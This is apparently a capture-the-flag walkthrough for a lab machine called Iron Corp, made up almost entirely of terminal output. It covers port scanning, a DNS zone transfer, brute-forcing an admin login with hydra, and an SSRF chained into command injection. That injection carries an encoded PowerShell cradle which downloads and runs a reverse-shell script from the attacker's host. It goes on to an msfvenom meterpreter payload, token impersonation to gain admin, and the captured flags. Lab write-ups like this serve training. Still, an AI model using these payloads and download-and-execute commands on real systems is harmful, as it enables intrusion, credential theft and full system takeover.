
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Not valid before: 2026-01-03T08:31:54
|_Not valid after:  2026-07-05T08:31:54
|_ssl-date: 2026-01-04T08:42:58+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-8VMBKF3G815
|   NetBIOS_Domain_Name: WIN-8VMBKF3G815
|   NetBIOS_Computer_Name: WIN-8VMBKF3G815
|   DNS_Domain_Name: WIN-8VMBKF3G815
|   DNS_Computer_Name: WIN-8VMBKF3G815
|   Product_Version: 10.0.14393
|_  System_Time: 2026-01-04T08:42:48+00:00
8080/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (87%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
11025/tcp open     http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Coming Soon - Start Bootstrap Theme
49667/tcp filtered unknown
49670/tcp open     msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


```

```
└─$ dig axfr @ironcorp.me ironcorp.me

; <<>> DiG 9.20.11-4+b1-Debian <<>> axfr @ironcorp.me ironcorp.me
; (1 server found)
;; global options: +cmd
ironcorp.me.            3600    IN      SOA     win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.            3600    IN      NS      win-8vmbkf3g815.
admin.ironcorp.me.      3600    IN      A       127.0.0.1
internal.ironcorp.me.   3600    IN      A       127.0.0.1
ironcorp.me.            3600    IN      SOA     win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 804 msec
;; SERVER: 10.64.131.144#53(ironcorp.me) (TCP)
;; WHEN: Sun Jan 04 03:51:59 EST 2026
;; XFR size: 5 records (messages 1, bytes 238)

```

```
└─$ hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -s 11025 admin.ironcorp.me http-get -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
[ATTEMPT] target admin.ironcorp.me - login "admin" - pass "123456" - 2 of 10002 [child 1] (0/0)
[ATTEMPT] target admin.ironcorp.me - login "admin" - pass "12345678" - 3 of 10002 [child 2] (0/0)
[ATTEMPT] target admin.ironcorp.me - login "admin" - pass "1234" - 4 of 10002 [child 3] (0/0)
[ATTEMPT] target admin.ironcorp.me - login "admin" - pass "qwerty" - 5 of 10002 [child 4] (0/0)
[ATTEMPT] target admin.ironcorp.me - login "admin" - pass "12345" - 6 of 10002 [child 5] (0/0)


[11025][http-get] host: admin.ironcorp.me   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-04 04:22:32

```

after login 

```

└─$ nano hi.txt                             

└─$ ip a | grep "tun0"
10: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    inet 192.168.15..../17 scope global tun0


└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.64.131.144 - - [04/Jan/2026 04:25:41] "GET /hi.txt HTTP/1.1" 200 -

http://admin.ironcorp.me:11025/?r=http://192.168.153.193:8000/hi.txt


```

`powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.8.106.222/Invoke-PowerShellTcp.ps1')`

```
%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%38%25%32%65%25%33%31%25%33%30%25%33%36%25%32%65%25%33%32%25%33%32%25%33%32%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39
```

```
GET /?r=http://internal.ironcorp.me:11025/name.php?name=test|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%38%25%32%65%25%33%31%25%33%30%25%33%36%25%32%65%25%33%32%25%33%32%25%33%32%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39 HTTP/1.1
Host: admin.ironcorp.me:11025
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
Connection: close
Upgrade-Insecure-Requests: 1
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ nc -lnvp 9001
Listening on 0.0.0.0 9001
whoami
Connection received on 10.10.204.174 49974
Windows PowerShell running as user WIN-8VMBKF3G815$ on WIN-8VMBKF3G815
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS E:\xampp\htdocs\internal>nt authority\system
PS E:\xampp\htdocs\internal> cd C:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/28/2020  12:39 PM             37 user.txt


PS C:\Users\Administrator\Desktop> type user.txt
thm{09b408056a13fc222f33e6e4cf599f8c}
```

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.106.222 LPORT=9002 -f psh -o meterpreter-64.ps1
```

```
powershell -command "& { iwr 10.8.106.222/meterpreter-64.ps1 -OutFile C:\Users\Administrator\Desktop\meterpreter-64.ps1 }"
Import-Module .\meterpreter-64.ps1
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 9002; set ExitOnSession false; exploit -j"
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use help <command> to learn more about any command

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
lhost => tun0
lport => 9002
ExitOnSession => false
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.8.106.222:9002
msf5 exploit(multi/handler) > [*] Sending stage (201283 bytes) to 10.10.187.24
[*] Meterpreter session 1 opened (10.8.106.222:9002 -> 10.10.187.24:50020) at 2020-10-22 00:12:42 +0200

msf5 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\IUSR
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
WIN-8VMBKF3G815\Admin
Window Manager\DWM-1

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter > impersonate_token "WIN-8VMBKF3G815\Admin"
[+] Delegation token available
[+] Successfully impersonated user WIN-8VMBKF3G815\Admin
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
meterpreter > shell
Process 2428 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

E:\xampp\htdocs\internal>whoami
whoami
win-8vmbkf3g815\admin

E:\xampp\htdocs\internal>cd C:\Users\Admin\Desktop
cd C:\Users\Admin\Desktop

E:\xampp\htdocs\internal>dir
dir
 Volume in drive E is New Volume
 Volume Serial Number is DE7B-E159

 Directory of E:\xampp\htdocs\internal

04/11/2020  09:11 AM    <DIR>          .
04/11/2020  09:11 AM    <DIR>          ..
03/27/2020  08:38 AM                53 .htaccess
04/11/2020  09:34 AM               131 index.php
04/11/2020  09:34 AM               142 name.php
               3 File(s)            326 bytes
               2 Dir(s)   1,468,583,936 bytes free

E:\xampp\htdocs\internal>dir C:\Users\Admin\Desktop
dir C:\Users\Admin\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 7805-3F28

 Directory of C:\Users\Admin\Desktop

04/12/2020  01:17 AM    <DIR>          .
04/12/2020  01:17 AM    <DIR>          ..
03/28/2020  12:39 PM                37 root.txt
               1 File(s)             37 bytes
               2 Dir(s)  39,161,888,768 bytes free

E:\xampp\htdocs\internal>type C:\Users\Admin\Desktop\root.txt
type C:\Users\Admin\Desktop\root.txt
thm{a1f936a086b367761cc4e7dd6cd2e2bd}
E:\xampp\htdocs\internal>
```